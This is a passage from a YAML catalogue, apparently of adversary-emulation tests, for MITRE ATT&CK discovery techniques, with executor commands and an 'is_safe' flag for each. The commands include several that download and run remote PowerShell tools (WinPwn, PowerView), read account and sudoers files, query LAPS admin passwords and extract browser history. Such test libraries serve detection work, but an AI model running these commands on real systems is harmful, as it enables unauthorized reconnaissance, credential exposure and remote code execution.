    - https://attack.mitre.org/techniques/T1083
  is_safe: false
- id: T1087.001
  name: Local Account
  description: |-
    Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

    Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, l...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Enumerate all accounts (Local)
      type: sh
      platform: linux
      command: |-
        cat /etc/passwd > /tmp/T1087.001.txt
        cat /tmp/T1087.001.txt
      cleanup: rm -f /tmp/T1087.001.txt
      timeout: 60
    - name: View sudoers access
      type: sh
      platform: linux
      command: |-
        if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;
        if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;
        cat /tmp/T1087.001.txt
      cleanup: rm -f /tmp/T1087.001.txt
      timeout: 60
      elevation_required: true
    - name: View sudoers access
      type: sh
      platform: macos
      command: |-
        if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;
        if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;
        cat /tmp/T1087.001.txt
      cleanup: rm -f /tmp/T1087.001.txt
      timeout: 60
      elevation_required: true
    - name: View accounts with UID 0
      type: sh
      platform: linux
      command: |-
        grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
        grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
        cat /tmp/T1087.001.txt 2>/dev/null
      cleanup: rm -f /tmp/T1087.001.txt 2>/dev/null
      timeout: 60
    - name: View accounts with UID 0
      type: sh
      platform: macos
      command: |-
        grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
        grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
        cat /tmp/T1087.001.txt 2>/dev/null
      cleanup: rm -f /tmp/T1087.001.txt 2>/dev/null
      timeout: 60
    - name: List opened files by user
      type: sh
      platform: linux
      command: username=$(id -u -n) && lsof -u $username
      timeout: 60
    - name: List opened files by user
      type: sh
      platform: macos
      command: username=$(id -u -n) && lsof -u $username
      timeout: 60
    - name: Show if a user account has ever logged in remotely
      type: sh
      platform: linux
      command: "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > /tmp/T1087.001.txt\ncat /tmp/T1087.001.txt"
      cleanup: rm -f /tmp/T1087.001.txt
      timeout: 60
    - name: Enumerate users and groups
      type: sh
      platform: linux
      command: |-
        groups
        id
      timeout: 60
    - name: Enumerate users and groups
      type: sh
      platform: macos
      command: |-
        groups
        id
      timeout: 60
    - name: Enumerate users and groups (2)
      type: sh
      platform: macos
      command: |-
        dscl . list /Groups
        dscl . list /Users
        dscl . list /Users | grep -v '_'
        dscacheutil -q group
        dscacheutil -q user
      timeout: 60
    - name: Enumerate all accounts on Windows (Local)
      type: cmd
      platform: windows
      command: |-
        net user
        dir c:\Users\
        cmdkey.exe /list
        net localgroup "Users"
        net localgroup
      timeout: 120
    - name: Enumerate all accounts via PowerShell (Local)
      type: powershell
      platform: windows
      command: |-
        net user
        get-localuser
        get-localgroupmember -group Users
        cmdkey.exe /list
        ls C:/Users
        get-childitem C:\Users\
        dir C:\Users\
        get-localgroup
        net localgroup
      timeout: 120
    - name: Enumerate logged on users via CMD (Local)
      type: cmd
      platform: windows
      command: query user
      timeout: 120
    - name: ESXi - Local Account Discovery via ESXCLI
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system account list"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1087/001
  is_safe: false
- id: T1087.002
  name: Domain Account
  description: |-
    Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.

    Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. ...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Enumerate all accounts (Domain)
      type: cmd
      platform: windows
      command: |-
        net user /domain
        net group /domain
      timeout: 120
    - name: Enumerate all accounts via PowerShell (Domain)
      type: powershell
      platform: windows
      command: |-
        net user /domain
        get-localgroupmember -group Users
        get-aduser -filter *
      timeout: 120
    - name: Enumerate logged on users via CMD (Domain)
      type: cmd
      platform: windows
      command: query user /SERVER:%COMPUTERNAME%
      timeout: 120
    - name: Automated AD Recon (ADRecon)
      type: powershell
      platform: windows
      command: Invoke-Expression "PathToAtomicsFolder\..\ExternalPayloads\ADRecon.ps1"
      cleanup: Get-ChildItem "PathToAtomicsFolder\..\ExternalPayloads" -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
      timeout: 120
    - name: Adfind -Listing password policy
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"  -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties'
      timeout: 120
    - name: Adfind - Enumerate Active Directory Admins
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc admincountdmp'
      timeout: 120
    - name: Adfind - Enumerate Active Directory User Objects
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=person)'
      timeout: 120
    - name: Adfind - Enumerate Active Directory Exchange AD Objects
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc exchaddresses'
      timeout: 120
    - name: Enumerate Default Domain Admin Details (Domain)
      type: cmd
      platform: windows
      command: net user administrator /domain
      timeout: 120
    - name: Enumerate Active Directory for Unconstrained Delegation
      type: powershell
      platform: windows
      command: Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain
      timeout: 120
    - name: Get-DomainUser with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
      timeout: 120
    - name: Enumerate Active Directory Users with ADSISearcher
      type: powershell
      platform: windows
      command: ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
      timeout: 120
    - name: Enumerate Linked Policies In ADSISearcher Discovery
      type: powershell
      platform: windows
      command: (([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
      timeout: 120
    - name: Enumerate Root Domain linked policies Discovery
      type: powershell
      platform: windows
      command: (([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
      timeout: 120
    - name: WinPwn - generaldomaininfo
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        generaldomaininfo -noninteractive -consoleoutput
      timeout: 120
    - name: Kerbrute - userenum
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain "PathToAtomicsFolder\..\ExternalPayloads\username.txt"
      timeout: 120
    - name: Wevtutil - Discover NTLM Users Remote
      type: powershell
      platform: windows
      command: |-
        $target = $env:LOGONSERVER
        $target = $target.Trim("\\")
        $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
        wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
      cleanup: Remove-Item -Path \\$IpAddress\c$\ntlmusers.evtx
      timeout: 120
    - name: Suspicious LAPS Attributes Query with Get-ADComputer all properties
      type: powershell
      platform: windows
      command: Get-ADComputer $env:computername -Properties *
      timeout: 120
    - name: Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property
      type: powershell
      platform: windows
      command: Get-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
      timeout: 120
    - name: Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope
      type: powershell
      platform: windows
      command: Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *
      timeout: 120
    - name: Suspicious LAPS Attributes Query with adfind all properties
      type: powershell
      platform: windows
      command: '& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"  -h $env:USERDOMAIN -s subtree -f "objectclass=computer" *'
      timeout: 120
    - name: Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd
      type: powershell
      platform: windows
      command: '& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"  -h $env:USERDOMAIN -s subtree -f "objectclass=computer" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime'
      timeout: 120
    - name: Active Directory Domain Search
      type: sh
      platform: linux
      command: ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=test" -s sub -a always -z 1000 dn
      timeout: 60
    - name: Account Enumeration with LDAPDomainDump
      type: sh
      platform: linux
      command: ldapdomaindump -u domain\user -p password 127.0.0.1 -o /tmp/T1087
      cleanup: rm -rf /tmp/T1087/ 2>/dev/null
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1087/002
  is_safe: false
- id: T1120
  name: Peripheral Device Discovery
  description: 'Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further ac...'
  tactic: discovery
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Win32_PnPEntity Hardware Inventory
      type: powershell
      platform: windows
      command: |-
        Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
        $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
        @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
      cleanup: Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
      timeout: 120
    - name: WinPwn - printercheck
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        printercheck -noninteractive -consoleoutput
      timeout: 120
    - name: Peripheral Device Discovery via fsutil
      type: cmd
      platform: windows
      command: fsutil fsinfo drives
      timeout: 120
    - name: Get Printer Device List via PowerShell Command
      type: powershell
      platform: windows
      command: Get-Printer
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1120
  is_safe: true
- id: T1124
  name: System Time Discovery
  description: 'An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citatio...'
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System Time Discovery
      type: cmd
      platform: windows
      command: |-
        net time \\localhost
        w32tm /tz
      timeout: 120
    - name: System Time Discovery - PowerShell
      type: powershell
      platform: windows
      command: Get-Date
      timeout: 120
    - name: System Time Discovery in FreeBSD/macOS
      type: sh
      platform: linux
      command: date
      timeout: 60
    - name: System Time Discovery in FreeBSD/macOS
      type: sh
      platform: macos
      command: date
      timeout: 60
    - name: System Time Discovery W32tm as a Delay
      type: cmd
      platform: windows
      command: W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2
      timeout: 120
    - name: System Time with Windows time Command
      type: cmd
      platform: windows
      command: time
      timeout: 120
    - name: Discover System Time Zone via Registry
      type: cmd
      platform: windows
      command: reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v TimeZoneKeyName
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1124
  is_safe: true
- id: T1135
  name: Network Share Discovery
  description: "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Fol..."
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Network Share Discovery
      type: sh
      platform: macos
      command: |-
        df -aH
        smbutil view -g //computer1
        showmount computer1
      timeout: 60
    - name: Network Share Discovery - linux
      type: bash
      platform: linux
      command: smbstatus --shares
      timeout: 60
      elevation_required: true
    - name: Network Share Discovery - FreeBSD
      type: sh
      platform: linux
      command: smbstatus --shares
      timeout: 60
      elevation_required: true
    - name: Network Share Discovery command prompt
      type: cmd
      platform: windows
      command: net view \\localhost
      timeout: 120
    - name: Network Share Discovery PowerShell
      type: powershell
      platform: windows
      command: get-smbshare
      timeout: 120
    - name: View available share drives
      type: cmd
      platform: windows
      command: net share
      timeout: 120
    - name: Share Discovery with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
      timeout: 120
    - name: PowerView ShareFinder
      type: powershell
      platform: windows
      command: |-
        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
        Invoke-ShareFinder -CheckShareAccess
      timeout: 120
    - name: WinPwn - shareenumeration
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        shareenumeration -noninteractive -consoleoutput
      timeout: 120
    - name: Network Share Discovery via dir command
      type: cmd
      platform: windows
      command: |-
        dir \\127.0.0.1\c$
        dir \\127.0.0.1\admin$
        dir \\127.0.0.1\IPC$
      timeout: 120
    - name: Enumerate All Network Shares with SharpShares
      type: powershell
      platform: windows
      command: cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe' /ldap:all | out-file -filepath "$env:temp\T1135SharpSharesOutput.txt"
      cleanup: remove-item "$env:temp\T1135SharpSharesOutput.txt" -force -erroraction silentlycontinue
      timeout: 120
    - name: Enumerate All Network Shares with Snaffler
      type: powershell
      platform: windows
      command: invoke-expression 'cmd /c start powershell -command { cmd /c "PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe" -a -o "$env:temp\T1135SnafflerOutput.txt" }; start-sleep 90; stop-process -name "snaffler"'
      cleanup: remove-item "$env:temp\T1135SnafflerOutput.txt" -force -erroraction silentlycontinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1135
  is_safe: false
- id: T1201
  name: Password Policy Discovery
  description: Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8,...
  tactic: discovery
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Examine password complexity policy - Ubuntu
      type: bash
      platform: linux
      command: cat /etc/pam.d/common-password
      timeout: 60
    - name: Examine password complexity policy - FreeBSD
      type: sh
      platform: linux
      command: cat /etc/pam.d/passwd
      timeout: 60
    - name: Examine password complexity policy - CentOS/RHEL 7.x
      type: bash
      platform: linux
      command: cat /etc/security/pwquality.conf
      timeout: 60
    - name: Examine password complexity policy - CentOS/RHEL 6.x
      type: bash
      platform: linux
      command: |-
        cat /etc/pam.d/system-auth
        cat /etc/security/pwquality.conf
      timeout: 60
    - name: Examine password expiration policy - All Linux
      type: bash
      platform: linux
      command: cat /etc/login.defs
      timeout: 60
    - name: Examine local password policy - Windows
      type: cmd
      platform: windows
      command: net accounts
      timeout: 120
    - name: Examine domain password policy - Windows
      type: cmd
      platform: windows
      command: net accounts /domain
      timeout: 120
    - name: Examine password policy - macOS
      type: bash
      platform: macos
      command: pwpolicy getaccountpolicies
      timeout: 60
    - name: Get-DomainPolicy with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
      timeout: 120
    - name: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
      type: powershell
      platform: windows
      command: get-addefaultdomainpasswordpolicy
      timeout: 120
    - name: Use of SecEdit.exe to export the local security policy (including the password policy)
      type: cmd
      platform: windows
      command: secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1201
  is_safe: false
- id: T1217
  name: Browser Information Discovery
  description: |-
    Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)

    Browser information may also highlight additional t...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux
      type: sh
      platform: linux
      command: |-
        find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \;
        cat /tmp/T1217-Firefox.txt 2>/dev/null
      cleanup: rm -f /tmp/T1217-Firefox.txt 2>/dev/null
      timeout: 60
    - name: List Mozilla Firefox Bookmark Database Files on macOS
      type: sh
      platform: macos
      command: |-
        find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> /tmp/T1217_Firefox.txt \;
        cat /tmp/T1217_Firefox.txt 2>/dev/null
      cleanup: rm -f /tmp/T1217_Firefox.txt 2>/dev/null
      timeout: 60
    - name: List Google Chrome Bookmark JSON Files on macOS
      type: sh
      platform: macos
      command: |-
        find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/T1217-Chrome.txt \;
        cat /tmp/T1217-Chrome.txt 2>/dev/null
      cleanup: rm -f /tmp/T1217-Chrome.txt 2>/dev/null
      timeout: 60
    - name: List Google Chromium Bookmark JSON Files on FreeBSD
      type: sh
      platform: linux
      command: |-
        find / -path "*/.config/chromium/*/Bookmarks" -exec echo {} >> /tmp/T1217-Chrome.txt \;
        cat /tmp/T1217-Chrome.txt 2>/dev/null
      cleanup: rm -f /tmp/T1217-Chrome.txt 2>/dev/null
      timeout: 60
    - name: List Google Chrome / Opera Bookmarks on Windows with powershell
      type: powershell
      platform: windows
      command: Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force
      timeout: 120
    - name: List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt
      type: cmd
      platform: windows
      command: where /R C:\Users\ Bookmarks
      timeout: 120
    - name: List Mozilla Firefox bookmarks on Windows with command prompt
      type: cmd
      platform: windows
      command: where /R C:\Users\ places.sqlite
      timeout: 120
    - name: List Internet Explorer Bookmarks using the command prompt
      type: cmd
      platform: windows
      command: dir /s /b %USERPROFILE%\Favorites
      timeout: 120
    - name: List Safari Bookmarks on MacOS
      type: sh
      platform: macos
      command: "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> /tmp/T1217-Safari.txt \ncat /tmp/T1217-Safari.txt"
      cleanup: rm -f /tmp/T1217-Safari.txt 2>/dev/null
      timeout: 60
    - name: Extract Edge Browsing History
      type: powershell
      platform: windows
      command: |-
        $URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $History = Get-Content -Path "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
        $History | Out-File -FilePath "$Env:USERPROFILE\Downloads\edgebrowsinghistory.txt"
      cleanup: Remove-Item -Path "$Env:USERPROFILE\Downloads\edgebrowsinghistory.txt"
      timeout: 120
      elevation_required: true
    - name: Extract chrome Browsing History
      type: powershell
      platform: windows
      command: |-
        $Username = (whoami).Split('\')[1]
        $URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $History = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
        $History | Out-File -FilePath "$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt"
      cleanup: Remove-Item -Path "$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1217
  is_safe: false
- id: T1482
  name: Domain Trust Discovery
  description: 'Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SI...'
  tactic: discovery
  platforms:
    - windows
  executors:
    - name: Windows - Discover domain trusts with dsquery
      type: cmd
      platform: windows
      command: dsquery * -filter "(objectClass=trustedDomain)" -attr *
      timeout: 120
    - name: Windows - Discover domain trusts with nltest
      type: cmd
      platform: windows
      command: |-
        nltest /domain_trusts
        nltest /trusted_domains
      timeout: 120
    - name: Powershell enumerate domains and forests
      type: powershell
      platform: windows
      command: |-
        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
        Get-NetDomainTrust
        Get-NetForestTrust
        Get-ADDomain
        Get-ADGroupMember Administrators -Recursive
        ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
      timeout: 120
    - name: Adfind - Enumerate Active Directory OUs
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=organizationalUnit)'
      timeout: 120
    - name: Adfind - Enumerate Active Directory Trusts
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"  -gcb -sc trustdmp'
      timeout: 120
    - name: Get-DomainTrust with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
      timeout: 120
    - name: Get-ForestTrust with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
      timeout: 120
    - name: TruffleSnout - Listing AD Infrastructure
      type: cmd
      platform: windows
      command: |-
        "PathToAtomicsFolder\..\ExternalPayloads\TruffleSnout.exe" forest -n %userdomain%
        "PathToAtomicsFolder\..\ExternalPayloads\TruffleSnout.exe" domain -n %userdomain%
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1482
  is_safe: true
- id: T1518
  name: Software Discovery
  description: |-
    Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

    Such software may be deployed widely across the environment for configuration management or security reaso...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Find and Display Internet Explorer Browser Version
      type: cmd
      platform: windows
      command: reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
      timeout: 120
    - name: Applications Installed
      type: powershell
      platform: windows
      command: |-
        Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
      timeout: 120
    - name: Find and Display Safari Browser Version
      type: sh
      platform: macos
      command: |-
        /usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
        /usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
      timeout: 60
    - name: WinPwn - Dotnetsearch
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Dotnetsearch -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - DotNet
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        dotnet -consoleoutput -noninteractive
      timeout: 120
    - name: WinPwn - powerSQL
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        powerSQL -noninteractive -consoleoutput
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1518
  is_safe: true
- id: T1518.001
  name: Security Software Discovery
  description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specifi...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Security Software Discovery
      type: cmd
      platform: windows
      command: "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\""
      timeout: 120
    - name: Security Software Discovery - powershell
      type: powershell
      platform: windows
      command: |-
        get-process | ?{$_.Description -like "*virus*"}
        get-process | ?{$_.Description -like "*carbonblack*"}
        get-process | ?{$_.Description -like "*defender*"}
        get-process | ?{$_.Description -like "*cylance*"}
        get-process | ?{$_.Description -like "*mc*"}
        get-process | ?{$_.ProcessName -like "*mc*"}
        get-process | Where-Object { $_.ProcessName -eq "Sysmon" }
      timeout: 120
    - name: Security Software Discovery - ps (macOS)
      type: sh
      platform: macos
      command: ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'
      timeout: 60
